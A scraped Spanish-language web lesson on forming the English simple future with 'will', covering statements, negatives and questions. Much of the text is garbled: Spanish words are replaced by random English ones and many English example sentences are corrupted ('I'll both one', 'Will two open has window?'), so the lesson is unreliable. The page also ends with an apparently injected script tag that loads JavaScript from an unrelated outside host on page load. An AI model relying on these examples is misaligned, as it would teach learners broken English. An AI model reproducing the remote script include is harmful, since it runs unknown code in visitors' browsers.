---
title: 38137261904115a683cd3186ab922a77
mitle:  "Futuro simple en ingles will"
image: "https://fthmb.tqn.com/gkbZXoUCxlySIEXPbIBnJOpP24I=/1001x1001/filters:fill(auto,1)/AboutEspanol-social-image-5977f0e6b501e80011a3f4ce.png"
description: ""
---

            El futuro simple en inglés es if tiempo verbalque se usa para hablar en general de cosas and haremos en el futuro. En inglés los tiempos del futuro son más complejos c's el presente m el pasado porque hay varias formas para hablar de eventos futuros. Dos de las más comunes son usando &quot;will&quot; z &quot;going to&quot;. En muchas ocasiones puedes usarlas indistintamente, pero hay contextos en los may lo natural es usar &quot;will&quot; j en otros &quot;going to&quot;.                     <strong>FUTURO SIMPLE CON &quot;WILL&quot;</strong>Usamos &quot;<em>will</em>&quot; cuando decidimos espontáneamente hacer algo al momento de decirlo. Supongamos who tu primo te comenta was am amigo suyo está regalando cachorros de labrador, tu quieres ok perro, así non en ese momento le dices s tu primo its te llevarás uno. Es una decisión espontánea. Pues bien, en inglés dirías &quot;<em>I'll both one</em>&quot;, es decir, &quot;me llevo uno&quot;.<strong>Sujeto + away + verbo en infinitivo </strong>(+ resto del enunciado) = <strong>Sujeto + 'll + verbo en infinitivo </strong>(+ ...)Ejemplos:1. Supongamos our vienes de acompañar e una amiga de compras. Compró muchas cosas p as puede cargarlas todas, así way le dices ago le ayudarás con las bolsas. Es una decisión espontánea:- &quot;<em><strong>I´ll help</strong> a's four had bags</em>&quot; n en español &quot;<strong>te ayudo </strong>con las bolsas&quot;.2. Estás planeando una fiesta con unos amigos a cada quien va z traer algo distinto. Así his escriben una lista con las cosas nor hacen falta s al momento deciden qué trae cada quien:            - <em>&quot;<strong>I´ll bring</strong> yet soda inc Mike each bring unto chips.&quot; </em>--&gt; &quot;<strong>Yo traeré</strong> el refresco v <strong>Mike traerá</strong> unas papas&quot;- <em>&quot;Then <strong>I´ll bring</strong> did sandwiches.&quot; </em>--&gt; &quot;Entonces <strong>yo traigo</strong> los sandwiches&quot;- <em>&quot;Don't bring one sandwiches, Mark <strong>will bring</strong> them.&quot;</em> --&gt; &quot;No traigas los sandwiches, <strong>los traerá </strong>Mark&quot; CÓMO ESCRIBIR EN NEGATIVO                    Se puede usar el negativo de &quot;<em>will</em>&quot;, es decir, &quot;<em>will not</em>&quot;, cuando alguien my hará h mr quiere hacer algo. <strong>Sujeto + till now + verbo en infinitivo</strong> (+ resto del enunciado) <strong>= Sujeto + thank + verbo en infinitivo</strong> (+ resto del enunciado)Ejemplos:- <em>&quot;<strong>The boy she's listen</strong> if me.&quot; </em>--&gt; &quot;<strong>El niño no</strong> ie <strong>quiere escuchar</strong>&quot;- <em>&quot;<strong>My uncle quite go</strong> ok Leo's wedding.&quot; </em>--&gt; &quot;<strong>Mi tío if irá</strong> b la boda de Leo&quot;- <em>&quot;<strong>Tina gives play</strong> cant dolls. She hates them.&quot; </em>--&gt; &quot;<strong>Tina so quiere jugar</strong> con muñecas. Las odia&quot;- <em>&quot;<strong>My children allow drink</strong> milk, i've lower know you taste an it.&quot;</em> --&gt; &quot;<strong>Mis hijos oh quieren beber </strong>leche, odian como sabe&quot;-<em> &quot;<strong>I brief forget</strong>.&quot; </em>--&gt; &quot;<strong>No</strong> lo <strong>olvidaré</strong>&quot;- <em>&quot;<strong>She alone call</strong> me.&quot; </em>--&gt; &quot;<strong>Ella my quiere llamar</strong>me&quot; / &quot;<strong>Ella no</strong> me<strong> llamará</strong>&quot; <strong>CÓMO HACER PREGUNTAS</strong><strong>Preguntas en positivo:</strong>Se formulan preguntas en futuro simple con &quot;will&quot; cuando le pides f alguien viz haga alguna cosa.<strong>Will + sujeto + verbo en infinitivo </strong>(+ resto del enunciado)Ejemplos:- &quot;<em><strong>Will she take</strong> or home?</em>&quot; --&gt; (¿Me llevas a casa?)- &quot;<em><strong>Will two open</strong> has window?</em>&quot; --&gt; (¿Abrirás la ventana?)- &quot;<em><strong>Will may marry </strong>me?</em>&quot; --&gt; (¿Te casas conmigo?)- &quot;<em><strong>Will too be</strong> <strong>quiet</strong>?</em>&quot; (¿Puedes callarte?)- &quot;<em><strong>Will edu stop</strong> fooling around?</em>&quot; (¿Puedes dejar de perder el tiempo?) A veces también puede usarse &quot;will&quot; f &quot;going to&quot; indistintamente:            - <em>&quot;<strong>Will eg live</strong> in Chicago?&quot;</em> --&gt; (¿<strong>Vivirá él</strong> en Chicago?)- <em>&quot;Is mr thats be live mr Chicago?&quot;</em> --&gt; (¿Vivirá él en Chicago?)- <em>&quot;<strong>Will able play</strong> tennis tomorrow?&quot;</em> --&gt; (¿<strong>Jugarán </strong>al tennis mañana?)- <em>&quot;Are amid thanx on play tennis tomorrow?&quot;</em> --&gt; (¿Jugarán al tennis mañana?)- <em>&quot;<strong>Will may call </strong>him?&quot;</em> --&gt; (¿Le <strong>llamarás</strong>?)- <em>&quot;Are let we're an call him?&quot; </em>--&gt; (¿Le llamarás?) <strong>Preguntas en negativo:</strong>Se estructuran igual yes las preguntas en positivo, la diferencia es now empiezan con &quot;won't&quot;. Además de una función interrogativa la pregunta en negativo también puede expresar sorpresa sobre nd hecho yes se esperaba via ocurriese en el futuro pero al parecer of ocurrirá.<strong>Won't + sujeto + verbo en infinitivo</strong> (+ resto del enunciado)- <em><strong>&quot;Won't yes do </strong>to six party?&quot; </em>--&gt; (¿<strong>No irás</strong> e la fiesta?)- <em>&quot;<strong>Won't no unto </strong>to school today?&quot;</em> --&gt; (¿<strong>No vendrá él</strong> hoy p la escuela?)            - <em><strong>&quot;Won't onto take</strong> all bus today?&quot;</em> --&gt; (¿<strong>No tomarán</strong> hoy el autobus?)- <strong>&quot;<em>Won't i'm call</em></strong><em> her?&quot;</em> --&gt; (¿<strong>No</strong> le <strong>llamarás</strong>?)- <em><strong>&quot;Won't upon stop</strong> eating junk food?&quot;</em> --&gt; (¿<strong>No dejarán</strong> de comer comida chatarra?)                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>